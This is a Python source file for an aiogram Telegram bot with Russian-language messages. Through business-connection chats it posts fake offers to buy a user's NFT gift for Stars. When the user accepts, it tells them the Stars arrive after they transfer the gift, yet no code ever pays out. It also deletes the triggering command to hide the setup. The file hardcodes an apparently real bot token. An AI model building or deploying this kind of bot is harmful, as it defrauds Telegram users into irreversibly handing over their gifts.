# lang: Python 3.11+
# file: bot.py
# runtime: aiogram 3.x

import asyncio
import logging
import re

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    BusinessConnection, LinkPreviewOptions,
)
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

BOT_TOKEN    = "9250624922:AAG1rvc3wBqwYJqanz0UxyI6ZSW3b25LWqw"
BOT_USERNAME = "of33r_bot"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp  = Dispatcher()

logging.basicConfig(level=logging.INFO)

OFFER_RE = re.compile(r"^\.offer\s+(\d+)\s+(.+?)\s+(\d+)$")


def make_nft_url(gift_id: str, gift_name: str) -> str:
    slug = gift_name.strip().lower().replace(" ", "-")
    return f"https://t.me/nft/{slug}-{gift_id}"


def build_offer_keyboard(stars: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"decline:{stars}"),
        InlineKeyboardButton(text="✅ Принять",   callback_data=f"accept:{stars}"),
    ]])


def build_accept_keyboard(stars: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="❔ Как это сделать?",  callback_data=f"howto:{stars}"),
        InlineKeyboardButton(text="🔄 Передать подарок", url=f"https://t.me/{BOT_USERNAME}?start=transfer"),
    ]])


async def delete_msg(chat_id: int, msg_id: int, biz_id: str | None) -> None:
    """Удаляет сообщение; biz_id обязателен для business-чатов."""
    try:
        kwargs: dict = {"chat_id": chat_id, "message_id": msg_id}
        if biz_id:
            kwargs["business_connection_id"] = biz_id
        await bot.delete_message(**kwargs)
    except Exception as e:
        logging.warning(f"delete failed: {e}")


async def process_offer(message: Message) -> None:
    if not message.text:
        return
    match = OFFER_RE.match(message.text.strip())
    if not match:
        return

    gift_id   = match.group(1)
    gift_name = match.group(2).strip()
    stars     = int(match.group(3))
    biz_id    = message.business_connection_id
    chat_id   = message.chat.id
    nft_url   = make_nft_url(gift_id, gift_name)
    sender    = message.from_user.username or message.from_user.first_name

    # удаляем .offer команду — с biz_id если это business-чат
    await delete_msg(chat_id, message.message_id, biz_id)

    # NFT ссылка ПЕРВОЙ в тексте → Telegram разворачивает preview
    text = (
        f'<a href="{nft_url}">🎁 {gift_name}</a>\n'
        f"<b>{sender}</b> предлагает продать этот подарок за <b>{stars} ⭐️</b>"
    )

    kwargs: dict = dict(
        chat_id=chat_id,
        text=text,
        reply_markup=build_offer_keyboard(stars),
        link_preview_options=LinkPreviewOptions(
            is_disabled=False,
            prefer_large_media=True,
            show_above_text=True,
        ),
    )
    if biz_id:
        kwargs["business_connection_id"] = biz_id

    await bot.send_message(**kwargs)


@dp.business_message()
async def on_business_message(message: Message) -> None:
    logging.info(f"business_message: {message.text!r}")
    await process_offer(message)


@dp.message()
async def on_message(message: Message) -> None:
    logging.info(f"message: {message.text!r}")
    await process_offer(message)


@dp.callback_query(F.data.startswith("decline:"))
async def cb_decline(callback: CallbackQuery) -> None:
    await delete_msg(callback.message.chat.id, callback.message.message_id, None)
    await bot.send_message(
        chat_id=callback.message.chat.id,
        text="❌ Вы отклонили предложение.",
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("accept:"))
async def cb_accept(callback: CallbackQuery) -> None:
    stars = int(callback.data.split(":")[1])
    await delete_msg(callback.message.chat.id, callback.message.message_id, None)
    await bot.send_message(
        chat_id=callback.message.chat.id,
        text=(
            f"💫 Чтобы получить <b>{stars} ⭐️</b> нужно передать подарок — "
            f"после этого они поступят на ваш Telegram аккаунт."
        ),
        reply_markup=build_accept_keyboard(stars),
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("howto:"))
async def cb_howto(callback: CallbackQuery) -> None:
    stars = int(callback.data.split(":")[1])
    await delete_msg(callback.message.chat.id, callback.message.message_id, None)
    await bot.send_message(
        chat_id=callback.message.chat.id,
        text=(
            "📖 <b>Как передать подарок:</b>\n\n"
            "1. Открой профиль или нажми «Передать подарок»\n"
            "2. Выбери нужный подарок из своей коллекции\n"
            "3. Нажми <b>Передать</b> и выбери получателя\n"
            f"4. После передачи <b>{stars} ⭐️</b> придут автоматически\n\n"
            "⚠️ Передача необратима — убедись что выбрал правильный подарок."
        ),
    )
    await callback.answer()


@dp.business_connection()
async def on_business_connection(bc: BusinessConnection) -> None:
    logging.info(f"business_connection: user={bc.user.id} enabled={bc.is_enabled}")


async def main() -> None:
    await dp.start_polling(bot, allowed_updates=[
        "message",
        "callback_query",
        "business_connection",
        "business_message",
        "edited_business_message",
        "deleted_business_messages",
    ])


if __name__ == "__main__":
    asyncio.run(main())
